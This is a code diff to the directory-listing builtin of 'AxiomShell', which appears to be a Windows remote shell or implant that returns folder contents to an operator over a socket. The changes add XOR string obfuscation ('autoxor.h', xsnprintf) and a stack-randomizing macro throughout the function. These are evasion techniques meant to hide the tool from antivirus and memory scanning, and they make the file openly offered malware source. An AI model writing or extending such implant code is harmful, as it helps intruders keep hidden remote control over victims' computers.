@@ -1,4 +1,5 @@
 #include "AxiomShell.h"
+#include "autoxor.h"
 #include "ls.h"
 #include "Glibc.h"
 
@@ -9,6 +10,7 @@
 
 void BUILTIN_LS_DISPLAY_folder_contents(SOCKET sock, char *folder_path)
 {
+	STACK_RANDOMIZER;
 	char searchBuffer[260];
 	CHAR sockBuffer[1024];
 	WIN32_FIND_DATA ffd;
@@ -23,12 +25,12 @@ void BUILTIN_LS_DISPLAY_folder_contents(SOCKET sock, char *folder_path)
 	hFind = FindFirstFileA(searchBuffer, &ffd);
 	if (hFind == INVALID_HANDLE_VALUE)
 	{
-		snprintf(sockBuffer, sizeof(sockBuffer), "[!] Error opening folder %s for listing (Err:%ld)\n", folder_path, GetLastError());
+		xsnprintf(sockBuffer, sizeof(sockBuffer), "[!] Error opening folder %s for listing (Err:%ld)\n", folder_path, GetLastError());
 		JSON_send_packets(JsonCommandOutput, sock, (void*)sockBuffer);
 		return;
 	}
 
-	snprintf(sockBuffer, sizeof(sockBuffer), "Contents of %s:\n", folder_path);
+	xsnprintf(sockBuffer, sizeof(sockBuffer), "Contents of %s:\n", folder_path);
 	JSON_send_packets(JsonCommandOutput, sock, (void*)sockBuffer);
 	do {
 		memset(searchBuffer, 0, sizeof(searchBuffer));
@@ -46,7 +48,7 @@ void BUILTIN_LS_DISPLAY_folder_contents(SOCKET sock, char *folder_path)
 
 		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 		{
-			snprintf(
+			xsnprintf(
 				sockBuffer, sizeof(sockBuffer),
 				"d%c%c%c%c%c%-5s %.2d/%.2d/%.2d %.2d:%.2d	%15s %s\n",
 				(fileAttr & FILE_ATTRIBUTE_ARCHIVE ? 'a' : '-'),
@@ -63,7 +65,7 @@ void BUILTIN_LS_DISPLAY_folder_contents(SOCKET sock, char *folder_path)
 			JSON_send_packets(JsonCommandOutput, sock, (void*)sockBuffer);
 		}
 		else {
-			snprintf(
+			xsnprintf(
 				sockBuffer, sizeof(sockBuffer),
 				"-%c%c%c%c%c%-5s %.2d/%.2d/%.2d %.2d:%.2d	%15lld %s\n",
 				(fileAttr & FILE_ATTRIBUTE_ARCHIVE ? 'a' : '-'),
